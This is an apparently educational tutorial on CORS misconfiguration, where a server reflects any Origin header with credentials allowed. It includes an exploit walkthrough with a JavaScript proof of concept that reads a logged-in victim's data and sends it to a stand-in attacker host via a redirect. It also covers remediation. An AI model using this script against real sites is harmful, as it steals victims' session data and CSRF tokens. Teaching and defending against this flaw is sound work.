# Server-generated ACAO header from client-specified Origin header


---

## 1. The basic concepts (no prior knowledge assumed)

### What is a website domain?
A domain is the main part of a website address, like `google.com` or `your-bank.com`.

### What is a “same-origin policy”?
Browsers have a security rule:  
A script from `website-A.com` should **not** be allowed to read data from `website-B.com` unless `website-B.com` explicitly says it’s OK.  
This prevents malicious sites from stealing your data from your bank or email.

### What is the `Origin` header?
When a web page from `malicious-site.com` tries to make a request to `vulnerable-site.com`, the browser automatically adds:
```
Origin: https://malicious-site.com
```
This tells the server where the request came from.

### What is `Access-Control-Allow-Origin` (ACAO)?
This is a response header the **server** sends back to the browser.  
It says: “Hey browser, this domain is allowed to read the response.”

Example:
```
Access-Control-Allow-Origin: https://trusted-site.com
```
If your page is from `trusted-site.com`, the browser lets your script read the data.

### What is `Access-Control-Allow-Credentials: true`?
This header tells the browser: “It’s OK to send cookies along with this cross-origin request.”  
Cookies often contain **session IDs** (like a temporary ID proving you’re logged in).

So with `withCredentials = true` in JavaScript, the browser includes your login session cookie.

---

## 2. What the server is doing wrong (the vulnerability)

Some lazy or poorly designed servers do this:

1. Read the `Origin` header from the request.
2. Copy its value exactly into the `Access-Control-Allow-Origin` response header.
3. Also set `Access-Control-Allow-Credentials: true`.

That means:
- If the request comes from `malicious-site.com`, the server replies with:
  ```
  Access-Control-Allow-Origin: https://malicious-site.com
  Access-Control-Allow-Credentials: true
  ```
- The browser sees: “OK, `malicious-site.com` is allowed to read this response, and I should send cookies for it.”

**This is dangerous** because the server is trusting **any domain** the browser claims to come from. An attacker can control that.

---

## 3. The attacker’s exploit (step by step)

### Step 1 – Attacker finds a vulnerable endpoint
The attacker looks for a URL on `vulnerable-website.com` that returns sensitive data, like:
```
https://vulnerable-website.com/sensitive-victim-data
```
Maybe this returns a user’s API key, private messages, or CSRF token.

### Step 2 – Attacker crafts a malicious web page
They host a page on `malicious-website.com` with the following JavaScript:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerable-website.com/sensitive-victim-data', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location = '//malicious-website.com/log?key=' + this.responseText;
}
```

What this does:
- Creates a request to the vulnerable site.
- `withCredentials = true` means: send the victim’s cookies (so the request runs with the victim’s logged-in session).
- When the response arrives, `reqListener` runs.
- The listener redirects the browser to the attacker’s logging page, appending the stolen data to the URL as a `key=` parameter.

### Step 3 – Attacker tricks the victim into visiting their page
They send the victim a link:
```
https://malicious-website.com/attack.html
```
Via email, social media, a fake ad, etc.

### Step 4 – What happens when victim clicks
1. Victim is logged into `vulnerable-website.com` (cookies are valid).
2. Victim visits `malicious-website.com`.
3. The malicious script runs in the victim’s browser.
4. Browser makes a request to `vulnerable-website.com/sensitive-victim-data`, including the victim’s cookies.
5. Vulnerable server sees `Origin: https://malicious-website.com` and reflects it back as `Access-Control-Allow-Origin: https://malicious-website.com`.
6. Browser sees that the allowed origin matches the page making the request → allows JavaScript to read the response.
7. The script steals the response data and redirects to `malicious-website.com/log?key=<stolen data>`.
8. Attacker checks their server logs and sees the stolen data.

---

## 4. Why this is so bad

- **No need to guess allowed domains** – the server accepts anything.
- **Works with credentials** – the attacker can act as the victim without ever knowing their password.
- **Silent** – the victim never sees the stolen data; they just visit a page and maybe see a redirect or a blank page.
- **Bypasses CSRF tokens** – if the endpoint returns a CSRF token, the attacker can steal it and then use it in future requests.

---

## 5. Real-world simplified example

Imagine `your-bank.com` has an API:
```
GET /api/balance
```
That returns:
```json
{"balance": 10000, "csrfToken": "abc123"}
```

Normally, only `your-bank.com` can read this. But if the bank’s server blindly mirrors the `Origin` header, then an attacker can:

1. Host a page that requests `/api/balance` with credentials.
2. Read your balance and CSRF token.
3. Use the CSRF token to transfer money out of your account.

---

## 6. How to fix it (for the server developer)

Never reflect arbitrary `Origin` headers. Instead:

- Use a **whitelist** of allowed domains.
- If credentials are allowed (`true`), never use `*` for ACAO; you must specify exact origins.
- Better: avoid `Access-Control-Allow-Credentials: true` unless absolutely necessary.
- Validate the `Origin` header against a strict list.

Example of a safe response:
```
Access-Control-Allow-Origin: https://trusted-partner.com
Access-Control-Allow-Credentials: true
```
Only `trusted-partner.com` gets access.

---

## 7. Summary for absolute beginners

- **Origin header** = “I came from domain X.”
- **ACAO header** = “Domain X is allowed to read this.”
- **Vulnerability** = Server copies whatever X is into ACAO.
- **Exploit** = Attacker makes victim visit their site → victim’s browser requests data from vulnerable site → server says “ok, attacker’s site can read it” → attacker steals data.

It’s like a security guard who asks “Who sent you?” and no matter what you say, he says “Oh, then you’re allowed in.”